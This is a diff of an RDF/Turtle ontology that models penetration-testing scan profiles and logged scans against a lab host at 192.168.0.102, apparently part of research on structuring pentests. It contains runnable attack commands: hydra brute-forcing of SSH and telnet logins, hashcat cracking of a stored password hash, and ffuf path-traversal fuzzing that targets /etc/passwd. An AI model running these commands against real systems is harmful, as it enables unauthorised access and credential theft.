+    ns2:command "hashcat '$6$dY5hO/6B48/9D.66$QHHDlmdkw.CHtzQg.W/e7s8SnGJaJgwVYwKzLu1vB6ZTeKBb2BXj1xc7wJJUl7nFgUXy6AHf/6z63yOPuXBT7/' /usr/share/wordlists/rockyou.txt --show" ;
+    ns2:duration 3.3554e+02 ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:executionTime "22:44 26/06/2023" ;
+    ns2:scanInput ns2:Input10 ;
+    ns2:scanProfile ns1:Profile16 .
 
 ns2:Service1 a ns2:Service ;
-    ns2:scanInfo ns2:Scan12,
-        ns2:Scan13,
-        ns2:Scan2 ;
+    ns2:scanInfo ns2:Scan1,
+        ns2:Scan11,
+        ns2:Scan12 ;
     ns2:serviceAccount ns2:Account3 ;
     ns2:serviceName "ssh" .
 
 ns2:Service2 a ns2:Service ;
-    ns2:scanInfo ns2:Scan2,
-        ns2:Scan3 ;
+    ns2:scanInfo ns2:Scan1,
+        ns2:Scan12,
+        ns2:Scan13,
+        ns2:Scan2 ;
     ns2:serviceAccount ns2:Account1 ;
     ns2:serviceName "telnet" .
-
-ns2:Service3 a ns2:Service ;
-    ns2:scanInfo ns2:Scan13 ;
-    ns2:serviceName "http" .
 
 ns1:Parameter3 a ns1:Parameter ;
     ns1:parameter "firmware" .
@@ -650,34 +354,6 @@ ns1:Parameter7 a ns1:Parameter ;
 
 ns1:Parameter8 a ns1:Parameter ;
     ns1:parameter "hashValue" .
-
-ns1:Profile1 a ns1:Profile ;
-    ns1:Command "gobuster dir -u http://<ipv4>:<port>/ -w wordlists/common.txt" ;
-    ns1:hasParameter ns1:Parameter1,
-        ns1:Parameter2 ;
-    ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement2 ;
-    ns1:hasResult ns1:Result1 ;
-    ns1:profileName "http_dir_scan_small" .
-
-ns1:Profile16 a ns1:Profile ;
-    ns1:Command "hydra -C wordlists/default_credentials/test.txt telnet://<ipv4>:<port> " ;
-    ns1:hasParameter ns1:Parameter1,
-        ns1:Parameter2 ;
-    ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement22 ;
-    ns1:hasResult ns1:Result10,
-        ns1:Result5 ;
-    ns1:profileName "telnet_attack" .
-
-ns1:Profile3 a ns1:Profile ;
-    ns1:Command "gobuster dir -u http://<ipv4>:<port>/ -w wordlists/big.txt" ;
-    ns1:hasParameter ns1:Parameter1,
-        ns1:Parameter2 ;
-    ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement4 ;
-    ns1:hasResult ns1:Result1 ;
-    ns1:profileName "http_dir_scan_big" .
 
 ns1:Requirement11 a ns1:Requirement ;
     ns1:requirement "accountPassword" ;
@@ -777,54 +453,17 @@ ns1:Result9 a ns1:Result ;
 ns2:Input10 a ns2:Input ;
     ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Hash3" .
 
-ns2:Input16 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#WebParameter1" .
-
-ns2:Input17 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#WebParameter2" .
-
-ns2:Input19 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#WebParameter3" .
-
-ns2:Input20 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#WebParameter4" .
-
-ns2:Input21 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#WebParameter5" .
-
-ns2:Input22 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#WebParameter6" .
-
-ns2:Input23 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#WebParameter7" .
-
-ns2:Input24 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#WebParameter8" .
+ns2:Input2 a ns2:Input ;
+    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Port2" .
 
 ns2:Input4 a ns2:Input ;
     ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Firmware1" .
 
-ns2:Input7 a ns2:Input ;
+ns2:Input8 a ns2:Input ;
     ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Hash1" .
 
 ns2:Input9 a ns2:Input ;
     ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Hash2" .
-
-ns2:Scan27 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/LFI.cgi?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
-    ns2:duration 3.568778e+04 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:10 23/06/2023" ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input15 ;
-    ns2:scanProfile ns1:Profile11 .
-
-ns2:Webpage3 a ns2:Webpage ;
-    ns2:page "/cgi-bin/LFI.cgi" ;
-    ns2:scanInfo ns2:Scan14 ;
-    ns2:size "0" ;
-    ns2:status "200" .
 
 ns1:Parameter4 a ns1:Parameter ;
     ns1:parameter "account" .
@@ -835,7 +474,7 @@ ns1:Parameter5 a ns1:Parameter ;
 ns1:Parameter6 a ns1:Parameter ;
     ns1:parameter "page" .
 
-ns1:Profile13 a ns1:Profile ;
+ns1:Profile12 a ns1:Profile ;
     ns1:Command "hydra -C wordlists/default_credentials/ssh_pwd.txt ssh://<ipv4>:<port>" ;
     ns1:hasParameter ns1:Parameter1,
         ns1:Parameter2 ;
@@ -845,6 +484,16 @@ ns1:Profile13 a ns1:Profile ;
         ns1:Result5 ;
     ns1:profileName "ssh_attack" .
 
+ns1:Profile15 a ns1:Profile ;
+    ns1:Command "hydra -C wordlists/default_credentials/test.txt telnet://<ipv4>:<port> " ;
+    ns1:hasParameter ns1:Parameter1,
+        ns1:Parameter2 ;
+    ns1:hasRequirement ns1:Requirement1,
+        ns1:Requirement22 ;
+    ns1:hasResult ns1:Result10,
+        ns1:Result5 ;
+    ns1:profileName "telnet_attack" .
+
 ns1:Profile6 a ns1:Profile ;
     ns1:Command "nmap -sC -sV -p- <ipv4>" ;
     ns1:hasParameter ns1:Parameter1 ;
@@ -853,15 +502,7 @@ ns1:Profile6 a ns1:Profile ;
         ns1:Result3 ;
     ns1:profileName "full_scan" .
 
-ns1:Profile7 a ns1:Profile ;
-    ns1:Command "sudo nmap -sU <ipv4>" ;
-    ns1:hasParameter ns1:Parameter1 ;
-    ns1:hasRequirement ns1:Requirement1 ;
-    ns1:hasResult ns1:Result2,
-        ns1:Result3 ;
-    ns1:profileName "udp_scan" .
-
-ns1:Profile9 a ns1:Profile ;
+ns1:Profile8 a ns1:Profile ;
     ns1:Command "/usr/src/firmwalker/firmwalker.sh <firmware>" ;
     ns1:hasParameter ns1:Parameter3 ;
     ns1:hasRequirement ns1:Requirement8 ;
@@ -878,26 +519,35 @@ ns1:Requirement12 a ns1:Requirement ;
     ns1:requirement "page" ;
     ns1:value "Webpage" .
 
-ns2:Input11 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Password2" .
-
-ns2:Input8 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Account3" .
-
-ns2:Scan3 a ns2:Scan ;
-    ns2:command "hydra -C wordlists/default_credentials/test.txt telnet://192.168.0.102:23 " ;
-    ns2:duration 6.686539e+04 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:05 23/06/2023" ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input2 ;
-    ns2:scanProfile ns1:Profile16 .
-
 ns1:Result2 a ns1:Result ;
     ns1:result "port" .
 
 ns1:Result3 a ns1:Result ;
     ns1:result "service" .
+
+ns2:Input11 a ns2:Input ;
+    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Password2" .
+
+ns2:Input7 a ns2:Input ;
+    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Account3" .
+
+ns2:Scan13 a ns2:Scan ;
+    ns2:command "hydra -C wordlists/default_credentials/test.txt telnet://192.168.0.102:23 " ;
+    ns2:duration 6.498506e+04 ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:executionTime "22:48 26/06/2023" ;
+    ns2:scanInput ns2:Input1,
+        ns2:Input2 ;
+    ns2:scanProfile ns1:Profile15 .
+
+ns2:Scan2 a ns2:Scan ;
+    ns2:command "hydra -C wordlists/default_credentials/test.txt telnet://192.168.0.102:23 " ;
+    ns2:duration 6.500348e+04 ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:executionTime "22:44 26/06/2023" ;
+    ns2:scanInput ns2:Input1,
+        ns2:Input2 ;
+    ns2:scanProfile ns1:Profile15 .
 
 ns2:Input5 a ns2:Input ;
     ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Account2" .
@@ -905,19 +555,19 @@ ns2:Input5 a ns2:Input ;
 ns2:Input6 a ns2:Input ;
     ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Password1" .
 
-ns2:Scan13 a ns2:Scan ;
+ns2:Scan1 a ns2:Scan ;
     ns2:command "nmap -sC -sV -p- 192.168.0.102" ;
-    ns2:duration 2.978438e+04 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:07 23/06/2023" ;
+    ns2:duration 3.677646e+04 ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:executionTime "22:43 26/06/2023" ;
     ns2:scanInput ns2:Input1 ;
     ns2:scanProfile ns1:Profile6 .
 
-ns2:Scan2 a ns2:Scan ;
+ns2:Scan12 a ns2:Scan ;
     ns2:command "nmap -sC -sV -p- 192.168.0.102" ;
-    ns2:duration 5.072437e+04 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:04 23/06/2023" ;
+    ns2:duration 3.664602e+04 ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:executionTime "22:46 26/06/2023" ;
     ns2:scanInput ns2:Input1 ;
     ns2:scanProfile ns1:Profile6 .
 
@@ -927,70 +577,23 @@ ns1:Result1 a ns1:Result ;
 ns1:Result10 a ns1:Result ;
     ns1:result "account" .
 
-ns2:Scan28 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/LFI.cgi?dxparam=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:duration 2.48984e+03 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:10 23/06/2023" ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input15,
-        ns2:Input16 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan29 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/LFI.cgi?param=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:duration 2.49502e+03 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:10 23/06/2023" ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input15,
-        ns2:Input17 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan16 a ns2:Scan ;
+ns2:Scan14 a ns2:Scan ;
     ns2:command "/usr/src/firmwalker/firmwalker.sh ~/Downloads/studentv2" ;
-    ns2:duration 4.668725e+04 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:09 23/06/2023" ;
+    ns2:duration 2.640658e+04 ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:executionTime "22:48 26/06/2023" ;
     ns2:scanInput ns2:Input4 ;
-    ns2:scanProfile ns1:Profile9 .
+    ns2:scanProfile ns1:Profile8 .
 
-ns2:Scan24 a ns2:Scan ;
-    ns2:command "gobuster dir -u http://192.168.0.102:80/ -w wordlists/common.txt" ;
-    ns2:duration 8.2237e+03 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:09 23/06/2023" ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12 ;
-    ns2:scanProfile ns1:Profile1 .
-
-ns2:Scan30 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/run.cgi?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
-    ns2:duration 3.394303e+04 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:11 23/06/2023" ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input18 ;
-    ns2:scanProfile ns1:Profile11 .
-
-ns2:Scan5 a ns2:Scan ;
+ns2:Scan4 a ns2:Scan ;
     ns2:command "/usr/src/firmwalker/firmwalker.sh ~/Downloads/studentv2" ;
-    ns2:duration 6.093755e+04 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:06 23/06/2023" ;
+    ns2:duration 2.714585e+04 ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:executionTime "22:44 26/06/2023" ;
     ns2:scanInput ns2:Input4 ;
-    ns2:scanProfile ns1:Profile9 .
+    ns2:scanProfile ns1:Profile8 .
 
-ns2:Webpage4 a ns2:Webpage ;
-    ns2:page "/cgi-bin/run.cgi" ;
-    ns2:scanInfo ns2:Scan14 ;
-    ns2:size "30" ;
-    ns2:status "200" .
-
-ns1:Profile17 a ns1:Profile ;
+ns1:Profile16 a ns1:Profile ;
     ns1:Command "hashcat '<hashValue>' /usr/share/wordlists/rockyou.txt --show" ;
     ns1:hasParameter ns1:Parameter8 ;
     ns1:hasRequirement ns1:Requirement23 ;
@@ -1000,7 +603,7 @@ ns1:Profile17 a ns1:Profile ;
 ns1:Result5 a ns1:Result ;
     ns1:result "password" .
 
-ns1:Profile14 a ns1:Profile ;
+ns1:Profile13 a ns1:Profile ;
     ns1:Command "hydra -l <account> -p <password> ssh://<ipv4>:<port>" ;
     ns1:hasParameter ns1:Parameter1,
         ns1:Parameter2,
@@ -1015,37 +618,14 @@ ns1:Profile14 a ns1:Profile ;
         ns1:Result5 ;
     ns1:profileName "ssh_account_password_attack" .
 
-ns2:Input15 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Webpage3" .
-
-ns2:Input18 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Webpage4" .
-
 ns2:Input3 a ns2:Input ;
     ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Port1" .
 
-ns2:Scan14 a ns2:Scan ;
-    ns2:command "gobuster dir -u http://192.168.0.102:80/ -w wordlists/big.txt" ;
-    ns2:duration 2.747725e+04 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:08 23/06/2023" ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12 ;
-    ns2:scanProfile ns1:Profile3 .
-
-ns1:Profile11 a ns1:Profile ;
-    ns1:Command "ffuf -ac -u http://<ipv4>:<port><page>?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
-    ns1:hasParameter ns1:Parameter1,
-        ns1:Parameter2,
-        ns1:Parameter6 ;
-    ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement12,
-        ns1:Requirement13 ;
-    ns1:hasResult ns1:Result8 ;
-    ns1:profileName "http_param_fuzz" .
-
 ns1:Parameter2 a ns1:Parameter ;
     ns1:parameter "port" .
+
+ns2:Input1 a ns2:Input ;
+    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#IpAddress1" .
 
 ns1:Parameter1 a ns1:Parameter ;
     ns1:parameter "ipv4" .
@@ -1053,24 +633,4 @@ ns1:Parameter1 a ns1:Parameter ;
 ns1:Requirement1 a ns1:Requirement ;
     ns1:requirement "ipv4" ;
     ns1:value "Ip" .
-
-ns1:Profile12 a ns1:Profile ;
-    ns1:Command "ffuf -ac -u http://<ipv4>:<port><page>?<webparam>=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns1:hasParameter ns1:Parameter1,
-        ns1:Parameter2,
-        ns1:Parameter6,
-        ns1:Parameter7 ;
-    ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement12,
-        ns1:Requirement14,
-        ns1:Requirement15,
-        ns1:Requirement16 ;
-    ns1:hasResult ns1:Result9 ;
-    ns1:profileName "http_param_input_fuzz" .
-
-ns2:Input12 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Port3" .
-
-ns2:Input1 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#IpAddress1" .
 
